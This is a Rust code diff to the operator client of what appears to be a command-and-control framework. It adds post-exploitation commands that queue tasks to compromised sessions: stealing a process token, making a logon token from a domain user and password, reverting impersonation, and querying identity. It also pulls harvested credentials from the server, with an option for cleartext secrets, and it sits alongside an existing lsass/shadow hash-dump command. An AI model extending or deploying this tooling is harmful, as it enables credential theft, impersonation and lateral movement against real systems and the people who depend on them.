@@ -9,7 +9,7 @@ use std::sync::mpsc::{self, Receiver, Sender};
 use std::time::{Duration, Instant};
 
 use crate::parse::{self};
-use crate::types::{CredEntry, FileEntry, ProcEntry, ResultView, SessionView, TaskAck};
+use crate::types::{CredEntry, CredKind, FileEntry, ProcEntry, ResultView, SessionView, TaskAck};
 
 /// Default poll interval for the session list.
 const SESSION_POLL: Duration = Duration::from_secs(2);
@@ -45,6 +45,29 @@ pub enum ParsedTable {
     Files(Vec<FileEntry>),
     Procs(Vec<ProcEntry>),
     Creds(Vec<CredEntry>),
+    Audit(Vec<AuditRow>),
+}
+
+/// One row of the server action-audit log (from `GET /api/audit`).
+#[derive(Clone, Debug, serde::Deserialize)]
+pub struct AuditRow {
+    pub seq: u64,
+    pub ts: u64,
+    pub operator: String,
+    pub action: String,
+    pub target: String,
+    pub detail: serde_json::Value,
+}
+
+/// Mirrors the server's `nyx_store::CredRecord` (`GET /api/creds` JSON) so we
+/// can deserialize it directly. `secret` is masked unless the request sent
+/// `?reveal=1`.
+#[derive(Clone, Debug, serde::Deserialize)]
+pub struct ServerCred {
+    pub realm: String,
+    pub user: String,
+    pub kind: String,
+    pub secret: String,
 }
 
 /// How (if at all) a shell task's output should be parsed before routing.
@@ -115,6 +138,31 @@ pub enum Cmd {
     Screenwatch { session: String, interval_secs: u32 },
     /// 凭据哈希提取。method 0=lsass 1=shadow。
     Hashdump { session: String, method: u8 },
+    /// 令牌窃取：复制 pid 的主令牌供后续冒用。
+    StealToken { session: String, pid: u32 },
+    /// 造令牌（make-token / pass-the-password）：domain\user + password。
+    /// logon_type 1=interactive 2=network 3=new-credentials。
+    MakeToken {
+        session: String,
+        domain: String,
+        user: String,
+        password: String,
+        logon_type: u8,
+    },
+    /// 丢弃当前线程冒用（保留令牌）。
+    Rev2Self { session: String },
+    /// 查询当前线程身份。
+    GetUid { session: String },
+    /// Pull the server-side credential store (`GET /api/creds`) and merge it
+    /// into the local vault. `reveal` true sends `?reveal=1` for cleartext.
+    FetchCreds { reveal: bool },
+    /// Query the server action-audit log (`GET /api/audit`). Optional operator
+    /// / action / limit filters.
+    FetchAudit {
+        operator: Option<String>,
+        action: Option<String>,
+        limit: Option<u32>,
+    },
     /// Stop the worker thread.
     Shutdown,
 }
@@ -530,6 +578,119 @@ async fn worker_loop(
                             pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}"), Level::Err),
+                    }
+                }
+                Cmd::StealToken { session, pid } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "stealtoken", "pid": pid });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] steal_token({pid}) (task {})", short(&session), tid), Level::Info);
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! steal_token: {e}"), Level::Err),
+                    }
+                }
+                Cmd::MakeToken { session, domain, user, password, logon_type } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] make_token({domain}\\{user}) (task {})", short(&session), tid), Level::Info);
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! make_token: {e}"), Level::Err),
+                    }
+                }
+                Cmd::Rev2Self { session } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "rev2self" });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] rev2self (task {})", short(&session), tid), Level::Info);
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}"), Level::Err),
+                    }
+                }
+                Cmd::GetUid { session } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "getuid" });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] getuid (task {})", short(&session), tid), Level::Info);
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}"), Level::Err),
+                    }
+                }
+                Cmd::FetchCreds { reveal } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let url = if reveal {
+                        format!("{srv}/api/creds?reveal=1")
+                    } else {
+                        format!("{srv}/api/creds")
+                    };
+                    match authed(client.get(&url), tok).send().await {
+                        Ok(resp) => match resp.json::<Vec<ServerCred>>().await {
+                            Ok(rows) => {
+                                let n = rows.len();
+                                log_push(&mut log_buf, &format!("server creds: {n} record(s)"), Level::Ok);
+                                // Adapt to the CredEntry overlay shape (principal = realm\user).
+                                let entries: Vec<CredEntry> = rows.into_iter().map(|c| {
+                                    let principal = if c.realm.is_empty() {
+                                        c.user.clone()
+                                    } else {
+                                        format!("{}\\{}", c.realm, c.user)
+                                    };
+                                    CredEntry {
+                                        source: c.kind,
+                                        principal,
+                                        kind: CredKind::Hash, // server kind is a string; show as-is in source
+                                        secret: c.secret,
+                                    }
+                                }).collect();
+                                parsed_buf = Some(ParsedTable::Creds(entries));
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! creds parse: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! creds fetch: {e}"), Level::Err),
+                    }
+                }
+                Cmd::FetchAudit { operator, action, limit } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    // Build the query string from the optional filters.
+                    let mut qs: Vec<String> = Vec::new();
+                    if let Some(op) = &operator { qs.push(format!("operator={op}")); }
+                    if let Some(ac) = &action { qs.push(format!("action={ac}")); }
+                    if let Some(l) = limit { qs.push(format!("limit={l}")); }
+                    let url = if qs.is_empty() {
+                        format!("{srv}/api/audit")
+                    } else {
+                        format!("{srv}/api/audit?{}", qs.join("&"))
+                    };
+                    match authed(client.get(&url), tok).send().await {
+                        Ok(resp) => match resp.json::<Vec<AuditRow>>().await {
+                            Ok(rows) => {
+                                let n = rows.len();
+                                log_push(&mut log_buf, &format!("audit: {n} record(s)"), Level::Ok);
+                                parsed_buf = Some(ParsedTable::Audit(rows));
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! audit parse: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}"), Level::Err),
                     }
                 }
             }
